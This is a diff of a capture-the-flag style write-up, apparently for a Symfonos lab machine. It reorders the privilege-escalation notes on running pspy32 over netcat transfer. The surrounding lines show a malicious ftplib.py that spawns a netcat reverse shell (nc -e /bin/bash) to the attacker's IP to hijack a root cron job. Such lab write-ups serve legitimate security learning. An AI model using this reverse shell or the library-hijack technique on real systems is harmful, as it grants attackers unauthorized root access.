@@ -129,6 +129,22 @@ $ nc -lvp 8787
 ```
 
 ## Privilege Escalation
+### pspy32
+* We send pspy32 to target machine.
+```
+$ nc 192.168.109.133 8080 < pspy32
+```
+```
+$ nc -lvp 8080 > pspy32
+```
+* Then, we run pspy32.
+```
+$ chmod 777 pspy32
+$ ./pspy32
+...
+2021/08/08 02:42:01 CMD: UID=0    PID=2460   | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
+...
+```
 ### tcpdump
 ```
 $ cd /tmp
@@ -164,22 +180,6 @@ connect to [192.168.109.128] from symfonos.local [192.168.109.133] 58604
 ### ssh
 ```
 $ ssh hades@192.168.109.133
-```
-### pspy32
-* We send pspy32 to target machine.
-```
-$ nc 192.168.109.133 8080 < pspy32
-```
-```
-$ nc -lvp 8080 > pspy32
-```
-* Then, we run pspy32.
-```
-$ chmod 777 pspy32
-$ ./pspy32
-...
-2021/08/08 02:42:01 CMD: UID=0    PID=2460   | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
-...
 ```
 ### ftpclient
 ```
@@ -219,12 +219,7 @@ $ cat ftplib.py
 import os
 os.system('nc -e /bin/bash 192.168.109.128 9090')
 ```
-### ftpclient
-```
-$ cd /opt/ftpclient/
-$ ./ftpclient.py
--bash: ./ftpclient.py: Permission denied
-```
+### nc
 ```
 $ nc -lvp 9090            
 listening on [any] 9090 ...
